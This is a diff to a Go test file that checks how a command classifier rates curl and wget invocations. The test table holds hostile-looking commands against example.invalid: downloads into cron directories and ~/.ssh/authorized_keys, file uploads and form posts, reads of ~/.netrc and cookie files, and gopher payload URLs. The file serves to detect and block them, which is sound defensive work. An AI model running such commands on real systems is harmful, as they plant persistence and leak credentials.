@@ -1,6 +1,7 @@
 package cmdclass
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/JiangHe12/opskit-core/v2/safety"
@@ -309,6 +310,206 @@ func TestClassifyAdversarial(t *testing.T) {
 				t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
 			}
 		})
+	}
+}
+
+func TestClassifyHTTPClientOptions(t *testing.T) {
+	t.Parallel()
+
+	type httpClientTest struct {
+		name string
+		cmd  string
+		want safety.Risk
+	}
+	tests := []httpClientTest{
+		{name: "curl default", cmd: "curl https://example.invalid", want: safety.R2},
+		{name: "curl common safe short inventory", cmd: "curl -fsSL https://example.invalid", want: safety.R2},
+		{name: "curl common safe long inventory", cmd: "curl --fail --silent --show-error --location --max-time=5 https://example.invalid", want: safety.R2},
+		{name: "curl host port shorthand", cmd: "curl localhost:8080/health", want: safety.R2},
+		{name: "curl ipv4 host port shorthand", cmd: "curl 127.0.0.1:8080/health", want: safety.R2},
+		{name: "curl read method separated", cmd: "curl -X GET https://example.invalid", want: safety.R2},
+		{name: "curl read method joined", cmd: "curl -sXHEAD https://example.invalid", want: safety.R2},
+		{name: "curl delete separated", cmd: "curl -X DELETE https://example.invalid/item", want: safety.R3},
+		{name: "curl put joined", cmd: "curl -sXPUT https://example.invalid/item", want: safety.R3},
+		{name: "curl patch long", cmd: "curl --request=PATCH https://example.invalid/item", want: safety.R3},
+		{name: "curl unknown method", cmd: "curl --request PURGE https://example.invalid/item", want: safety.R3},
+		{name: "curl missing method", cmd: "curl --request", want: safety.R3},
+		{name: "curl empty inline method", cmd: "curl --request= https://example.invalid", want: safety.R3},
+		{name: "curl config separated", cmd: "curl --config safe.cfg https://example.invalid", want: safety.R3},
+		{name: "curl config joined short", cmd: "curl -sKsafe.cfg https://example.invalid", want: safety.R3},
+		{name: "curl quote separated", cmd: "curl --quote 'DELE item' ftp://example.invalid", want: safety.R3},
+		{name: "curl prequote inline", cmd: "curl --prequote='SITE CHMOD 777 item' ftp://example.invalid", want: safety.R3},
+		{name: "curl postquote", cmd: "curl --postquote 'RNTO item' ftp://example.invalid", want: safety.R3},
+		{name: "curl quote short combined", cmd: "curl -sQ'DELE item' ftp://example.invalid", want: safety.R3},
+		{name: "curl alternative ftp command", cmd: "curl --ftp-alternative-to-user 'DELE item' ftp://example.invalid", want: safety.R3},
+		{name: "curl upload", cmd: "curl --upload-file payload https://example.invalid", want: safety.R3},
+		{name: "curl data equals", cmd: "curl --data=value https://example.invalid", want: safety.R3},
+		{name: "curl form short", cmd: "curl -F file=@payload https://example.invalid", want: safety.R3},
+		{name: "curl json", cmd: "curl --json '{}' https://example.invalid", want: safety.R3},
+		{name: "curl sensitive output", cmd: "curl -o /etc/cron.d/job https://example.invalid/job", want: safety.R3},
+		{name: "curl sensitive output joined", cmd: "curl -so~/.ssh/authorized_keys https://example.invalid/key", want: safety.R3},
+		{name: "curl relative ssh output", cmd: "curl -o .ssh/config https://example.invalid/config", want: safety.R3},
+		{name: "curl sensitive output dir", cmd: "curl --output-dir=/etc -O https://example.invalid/job", want: safety.R3},
+		{name: "curl ordinary output", cmd: "curl --output ./download.bin https://example.invalid/file", want: safety.R2},
+		{name: "curl missing output", cmd: "curl -o", want: safety.R3},
+		{name: "curl empty inline output", cmd: "curl --output= https://example.invalid", want: safety.R3},
+		{name: "curl ordinary cookie jar", cmd: "curl --cookie-jar ./cookies.txt https://example.invalid", want: safety.R2},
+		{name: "curl sensitive cookie jar", cmd: "curl -c~/.bashrc https://example.invalid", want: safety.R3},
+		{name: "curl missing cookie jar", cmd: "curl --cookie-jar", want: safety.R3},
+		{name: "curl ordinary dump header", cmd: "curl -D./headers.txt https://example.invalid", want: safety.R2},
+		{name: "curl sensitive dump header", cmd: "curl --dump-header=/etc/profile https://example.invalid", want: safety.R3},
+		{name: "curl ordinary trace", cmd: "curl --trace ./trace.txt https://example.invalid", want: safety.R2},
+		{name: "curl sensitive trace ascii", cmd: "curl --trace-ascii=~/.ssh/authorized_keys https://example.invalid", want: safety.R3},
+		{name: "curl ordinary stderr file", cmd: "curl --stderr ./curl.err https://example.invalid", want: safety.R2},
+		{name: "curl sensitive etag save", cmd: "curl --etag-save /var/spool/cron/job https://example.invalid", want: safety.R3},
+		{name: "curl sensitive alt svc", cmd: "curl --alt-svc ~/.bashrc https://example.invalid", want: safety.R3},
+		{name: "curl sensitive hsts", cmd: "curl --hsts /etc/curl.hsts https://example.invalid", want: safety.R3},
+		{name: "curl sensitive libcurl", cmd: "curl --libcurl ~/.profile https://example.invalid", want: safety.R3},
+		{name: "curl write out ordinary output", cmd: "curl --write-out '%output{./metrics.txt}%{http_code}' https://example.invalid", want: safety.R2},
+		{name: "curl write out append ordinary output", cmd: "curl -w '%output{>>./metrics.txt}%{http_code}' https://example.invalid", want: safety.R2},
+		{name: "curl write out sensitive output", cmd: "curl --write-out '%output{/etc/cron.d/job}%{http_code}' https://example.invalid", want: safety.R3},
+		{name: "curl write out missing output target", cmd: "curl --write-out '%output{}' https://example.invalid", want: safety.R3},
+		{name: "curl write out malformed output", cmd: "curl --write-out '%output{./metrics.txt' https://example.invalid", want: safety.R3},
+		{name: "curl write out file input", cmd: "curl --write-out @format.txt https://example.invalid", want: safety.R3},
+		{name: "curl literal header", cmd: "curl --header 'Accept: application/json' https://example.invalid", want: safety.R2},
+		{name: "curl header file", cmd: "curl --header @headers.txt https://example.invalid", want: safety.R3},
+		{name: "curl override read method", cmd: "curl -H 'X-HTTP-Method-Override: HEAD' https://example.invalid", want: safety.R2},
+		{name: "curl override delete method", cmd: "curl --header='X-HTTP-Method-Override: DELETE' https://example.invalid", want: safety.R3},
+		{name: "curl alternate override delete method", cmd: "curl --header='X-Method-Override: DELETE' https://example.invalid", want: safety.R3},
+		{name: "curl multiline header", cmd: "curl --header 'Accept: text/plain\nX-HTTP-Method-Override: DELETE' https://example.invalid", want: safety.R3},
+		{name: "curl literal cookie", cmd: "curl --cookie session=redacted https://example.invalid", want: safety.R2},
+		{name: "curl cookie file", cmd: "curl -b cookies.txt https://example.invalid", want: safety.R3},
+		{name: "curl cookie at file", cmd: "curl --cookie=@cookies.txt https://example.invalid", want: safety.R3},
+		{name: "curl netrc file", cmd: "curl --netrc-file ~/.netrc https://example.invalid", want: safety.R3},
+		{name: "curl literal url query", cmd: "curl --url-query name=value https://example.invalid", want: safety.R2},
+		{name: "curl url query at file", cmd: "curl --url-query @query.txt https://example.invalid", want: safety.R3},
+		{name: "curl named url query file", cmd: "curl --url-query name@query.txt https://example.invalid", want: safety.R3},
+		{name: "curl variable environment", cmd: "curl --variable '%TOKEN' --expand-header 'Authorization: {{TOKEN}}' https://example.invalid", want: safety.R3},
+		{name: "curl automatic client credential", cmd: "curl --ssl-auto-client-cert https://example.invalid", want: safety.R3},
+		{name: "curl remote name", cmd: "curl --remote-name https://example.invalid/file", want: safety.R3},
+		{name: "curl remote name short", cmd: "curl -LO https://example.invalid/file", want: safety.R3},
+		{name: "curl remote name all", cmd: "curl --remote-name-all https://example.invalid/file", want: safety.R3},
+		{name: "curl remote header name", cmd: "curl --remote-header-name https://example.invalid/file", want: safety.R3},
+		{name: "curl create dirs", cmd: "curl --create-dirs -o ./a/b https://example.invalid/file", want: safety.R3},
+		{name: "curl remove on error", cmd: "curl --remove-on-error -o ./file https://example.invalid", want: safety.R3},
+		{name: "curl gopher payload", cmd: "curl 'gopher://example.invalid/_DELETE%20/item'", want: safety.R3},
+		{name: "curl opaque gopher payload", cmd: "curl gopher:70", want: safety.R3},
+		{name: "curl quoted protocol glob", cmd: "curl '{https,gopher}://example.invalid/_payload'", want: safety.R3},
+		{name: "curl telnet payload", cmd: "curl telnet://example.invalid:23", want: safety.R3},
+		{name: "curl smtp payload", cmd: "curl smtp://example.invalid", want: safety.R3},
+		{name: "curl unsafe explicit url", cmd: "curl --url=gopher://example.invalid/_payload", want: safety.R3},
+		{name: "curl safe explicit url", cmd: "curl --url https://example.invalid", want: safety.R2},
+		{name: "curl no value option cannot hide unsafe url", cmd: "curl --haproxy-protocol gopher://example.invalid/_payload", want: safety.R3},
+		{name: "curl ssl flag cannot hide unsafe url", cmd: "curl --ssl-auto-client-cert gopher://example.invalid/_payload", want: safety.R3},
+		{name: "curl unknown long option", cmd: "curl --mystery https://example.invalid", want: safety.R3},
+		{name: "curl unknown long option equals", cmd: "curl --mystery=value https://example.invalid", want: safety.R3},
+		{name: "curl unknown short option", cmd: "curl -fW https://example.invalid", want: safety.R3},
+		{name: "curl missing safe option value", cmd: "curl --max-time", want: safety.R3},
+		{name: "curl next operation destructive", cmd: "curl https://example.invalid --next -X DELETE https://example.invalid/item", want: safety.R3},
+		{name: "curl next operation safe", cmd: "curl -fsS https://example.invalid/one --next --head https://example.invalid/two", want: safety.R2},
+		{name: "curl next with value", cmd: "curl --next=value https://example.invalid", want: safety.R3},
+		{name: "curl end options", cmd: "curl -- -X DELETE", want: safety.R2},
+		{name: "curl end options still rejects unsafe url", cmd: "curl -- gopher://example.invalid/_payload", want: safety.R3},
+		{name: "wget default", cmd: "wget https://example.invalid", want: safety.R2},
+		{name: "wget common safe short inventory", cmd: "wget -q -T 5 https://example.invalid/file", want: safety.R2},
+		{name: "wget common safe long inventory", cmd: "wget --quiet --timeout=5 --tries 2 https://example.invalid/file", want: safety.R2},
+		{name: "wget safe value option inventory", cmd: "wget --compression=gzip --secure-protocol TLSv1_2 --remote-encoding=UTF-8 --report-speed=bits https://example.invalid/file", want: safety.R2},
+		{name: "wget ftp single download", cmd: "wget ftp://example.invalid/file", want: safety.R2},
+		{name: "wget quoted ftp wildcard", cmd: "wget 'ftp://example.invalid/*.conf'", want: safety.R3},
+		{name: "wget host port shorthand", cmd: "wget localhost:8080/file", want: safety.R2},
+		{name: "wget read method", cmd: "wget --method=GET https://example.invalid", want: safety.R2},
+		{name: "wget delete method", cmd: "wget --method DELETE https://example.invalid/item", want: safety.R3},
+		{name: "wget unknown method", cmd: "wget --method=PURGE https://example.invalid/item", want: safety.R3},
+		{name: "wget missing method", cmd: "wget --method", want: safety.R3},
+		{name: "wget override read method", cmd: "wget --header='X-HTTP-Method-Override: GET' https://example.invalid", want: safety.R2},
+		{name: "wget override mutation method", cmd: "wget --header 'X-HTTP-Method-Override: PATCH' https://example.invalid", want: safety.R3},
+		{name: "wget config", cmd: "wget --config=safe.cfg https://example.invalid", want: safety.R3},
+		{name: "wget execute short", cmd: "wget -e use_proxy=yes https://example.invalid", want: safety.R3},
+		{name: "wget use askpass", cmd: "wget --use-askpass=helper https://example.invalid", want: safety.R3},
+		{name: "wget use askpass environment", cmd: "wget --use-askpass https://example.invalid", want: safety.R3},
+		{name: "wget post body", cmd: "wget --post-data=a=b https://example.invalid", want: safety.R3},
+		{name: "wget body file", cmd: "wget --body-file payload https://example.invalid", want: safety.R3},
+		{name: "wget delete after", cmd: "wget --delete-after https://example.invalid", want: safety.R3},
+		{name: "wget unlink", cmd: "wget --unlink https://example.invalid", want: safety.R3},
+		{name: "wget recursive", cmd: "wget --recursive https://example.invalid", want: safety.R3},
+		{name: "wget recursive short", cmd: "wget -r https://example.invalid", want: safety.R3},
+		{name: "wget mirror", cmd: "wget -m https://example.invalid", want: safety.R3},
+		{name: "wget input file", cmd: "wget -i urls.txt", want: safety.R3},
+		{name: "wget page requisites", cmd: "wget -p https://example.invalid/page", want: safety.R3},
+		{name: "wget span hosts", cmd: "wget --span-hosts https://example.invalid/page", want: safety.R3},
+		{name: "wget preserve permissions", cmd: "wget --preserve-permissions ftp://example.invalid/file", want: safety.R3},
+		{name: "wget content disposition", cmd: "wget --content-disposition https://example.invalid/file", want: safety.R3},
+		{name: "wget trust server names", cmd: "wget --trust-server-names https://example.invalid/file", want: safety.R3},
+		{name: "wget default page", cmd: "wget --default-page=.bashrc https://example.invalid/", want: safety.R3},
+		{name: "wget sensitive prefix", cmd: "wget -P/etc https://example.invalid/job", want: safety.R3},
+		{name: "wget sensitive log", cmd: "wget --output-file=/var/log/job.log https://example.invalid", want: safety.R3},
+		{name: "wget sensitive append log", cmd: "wget -qa~/.bashrc https://example.invalid", want: safety.R3},
+		{name: "wget ordinary output", cmd: "wget -qO./download.bin https://example.invalid/file", want: safety.R2},
+		{name: "wget relative ssh output", cmd: "wget -O .ssh/config https://example.invalid/config", want: safety.R3},
+		{name: "wget missing output", cmd: "wget -O", want: safety.R3},
+		{name: "wget empty inline output", cmd: "wget --output-document= https://example.invalid/file", want: safety.R3},
+		{name: "wget ordinary save cookies", cmd: "wget --save-cookies ./cookies.txt https://example.invalid", want: safety.R2},
+		{name: "wget sensitive save cookies", cmd: "wget --save-cookies ~/.bashrc https://example.invalid", want: safety.R3},
+		{name: "wget missing save cookies", cmd: "wget --save-cookies", want: safety.R3},
+		{name: "wget ordinary hsts file", cmd: "wget --hsts-file=./hsts.txt https://example.invalid", want: safety.R2},
+		{name: "wget sensitive hsts file", cmd: "wget --hsts-file /etc/hosts https://example.invalid", want: safety.R3},
+		{name: "wget ordinary warc file", cmd: "wget --warc-file ./archive https://example.invalid", want: safety.R2},
+		{name: "wget sensitive warc tempdir", cmd: "wget --warc-tempdir=/var/tmp https://example.invalid", want: safety.R3},
+		{name: "wget other warc option uncertain", cmd: "wget --warc-cdx https://example.invalid", want: safety.R3},
+		{name: "wget default bashrc basename", cmd: "wget https://example.invalid/.bashrc", want: safety.R3},
+		{name: "wget encoded bashrc basename", cmd: "wget https://example.invalid/%2Ebashrc", want: safety.R3},
+		{name: "wget default ssh basename", cmd: "wget https://example.invalid/.ssh", want: safety.R3},
+		{name: "wget default cron basename", cmd: "wget https://example.invalid/cron.d", want: safety.R3},
+		{name: "wget explicit safe output overrides sensitive basename", cmd: "wget -O ./download.txt https://example.invalid/.bashrc", want: safety.R2},
+		{name: "wget directory prefix retains sensitive basename", cmd: "wget -P ./downloads https://example.invalid/.bashrc", want: safety.R3},
+		{name: "wget spider does not write sensitive basename", cmd: "wget --spider https://example.invalid/.bashrc", want: safety.R2},
+		{name: "wget unsafe protocol", cmd: "wget gopher://example.invalid/_payload", want: safety.R3},
+		{name: "wget opaque unsafe protocol", cmd: "wget gopher:70", want: safety.R3},
+		{name: "wget unknown long option", cmd: "wget --mystery https://example.invalid", want: safety.R3},
+		{name: "wget unknown long option equals", cmd: "wget --mystery=value https://example.invalid", want: safety.R3},
+		{name: "wget unknown short option", cmd: "wget -qz https://example.invalid", want: safety.R3},
+		{name: "wget missing safe option value", cmd: "wget --timeout", want: safety.R3},
+		{name: "wget missing combined value", cmd: "wget -qT", want: safety.R3},
+		{name: "wget end options", cmd: "wget -- --method DELETE", want: safety.R2},
+		{name: "wget end options sensitive basename", cmd: "wget -- https://example.invalid/.profile", want: safety.R3},
+	}
+
+	for index := range tests {
+		tests[index].cmd = disableHTTPClientConfig(tests[index].cmd)
+	}
+	rawTests := []httpClientTest{
+		{name: "curl implicit config is unknown", cmd: "curl https://example.invalid", want: safety.R3},
+		{name: "curl disable must be first", cmd: "curl --silent -q https://example.invalid", want: safety.R3},
+		{name: "curl leading combined disable", cmd: "curl -qfsS https://example.invalid", want: safety.R2},
+		{name: "curl leading long disable", cmd: "curl --disable --silent https://example.invalid", want: safety.R2},
+		{name: "wget implicit config is unknown", cmd: "wget https://example.invalid", want: safety.R3},
+		{name: "wget no config must be first", cmd: "wget --quiet --no-config https://example.invalid", want: safety.R3},
+	}
+
+	for _, group := range [][]httpClientTest{tests, rawTests} {
+		for _, tt := range group {
+			t.Run(tt.name, func(t *testing.T) {
+				t.Parallel()
+				if got := Classify(tt.cmd); got != tt.want {
+					t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
+				}
+			})
+		}
+	}
+}
+
+func disableHTTPClientConfig(command string) string {
+	switch {
+	case command == "curl":
+		return "curl -q"
+	case strings.HasPrefix(command, "curl "):
+		return "curl -q " + strings.TrimPrefix(command, "curl ")
+	case command == "wget":
+		return "wget --no-config"
+	case strings.HasPrefix(command, "wget "):
+		return "wget --no-config " + strings.TrimPrefix(command, "wget ")
+	default:
+		return command
 	}
 }
 
